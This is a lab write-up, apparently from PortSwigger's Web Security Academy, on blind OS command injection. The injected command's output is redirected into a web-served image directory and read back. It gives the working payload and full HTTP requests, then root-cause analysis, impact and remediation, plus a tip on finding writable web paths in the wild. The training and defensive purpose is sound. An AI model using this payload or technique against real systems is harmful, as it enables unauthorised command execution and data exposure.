# Lab 03 — Blind OS Command Injection with Output Redirection

## 1. Overview

| Field | Value |
|---|---|
| Vulnerability Class | OS Command Injection (Blind / Output Redirection) |
| CWE | CWE-78 |
| Difficulty | Practitioner |
| Source | PortSwigger Web Security Academy |
| Objective | Execute `whoami` and retrieve its output despite no reflected response |

## 2. Summary

As in Lab 02, the feedback function executes a shell command built from user input and returns no output in the HTTP response. However, this application serves static product images from a **writable** filesystem path (`/var/www/images/`). This allows the injected command's output to be redirected into a file inside that path using the `>` operator, and then retrieved simply by requesting the file through the existing image-loading endpoint.

## 3. Proof of Concept (PoC)

1. Submit the feedback form with dummy data and capture `POST /feedback/submit` in Burp Suite; send it to Repeater.
2. Inject a payload that redirects `whoami`'s output into the writable image directory:
   ```
   email=||whoami>/var/www/images/output.txt||
   ```
3. Send the request (it returns a normal `200 OK` with no visible output — this is expected).
4. Find a product image request (e.g. `GET /image?filename=<name>.jpg`) in the Proxy history and send it to Repeater.
5. Change the `filename` parameter to the file you just created:
   ```
   GET /image?filename=output.txt
   ```
6. Send the request and read the command output directly from the response body.

## 4. Evidence

**Step 1 — Injection request:**
```
POST /feedback/submit HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<token>&name=test&email=||whoami>/var/www/images/output.txt||&subject=test&message=test
```

**Step 2 — Retrieval request:**
```
GET /image?filename=output.txt HTTP/2
Host: <lab-id>.web-security-academy.net
```

**Response:**
```
HTTP/2 200 OK
Content-Type: text/plain

peter-XXXXXX
```

## 5. Root Cause Analysis

**Attacker perspective:** The shell interprets the empty command before `||` as a failure, triggering the right-hand side: `whoami > /var/www/images/output.txt`. This redirects `whoami`'s stdout into a new file inside a directory the web server already serves statically — effectively turning a blind vulnerability into a readable one by (ab)using an existing file-serving feature as the output channel.

**Defender perspective:** Two independent weaknesses combine here: (1) unsanitised input reaching a shell command, and (2) a writable directory inside the web root that is also publicly servable. Neither flaw alone is as severe; together they convert "blind" injection into full data exposure.

**Real-world note:** Production web server accounts (`www-data`, IIS AppPool identities) often lack write access to most of the filesystem. When hunting for this pattern in the wild, look specifically for upload directories, temp/cache folders, or any statically-served path with write permissions (`/uploads/`, `/static/`, `/tmp/` combined with an LFI, etc.).

## 6. Impact

An attacker gains a reliable, repeatable channel to read the output of arbitrary injected commands — effectively equivalent to verbose injection despite the application never reflecting command output directly. This can be leveraged to read configuration files, enumerate the filesystem, or stage further exploitation.

## 7. Remediation

- Eliminate the shell call entirely in favour of a safe mail-sending API.
- Ensure directories that serve static content are never writable by the application process, and vice versa — writable directories (uploads, temp) should never be directly web-accessible or should disable script/content execution and be served with strict content-type handling.
- Apply strict input validation on `email` as in Lab 02.
- Apply the principle of least privilege to the service account's filesystem permissions.

## 8. References

- [PortSwigger — Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection)
- [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
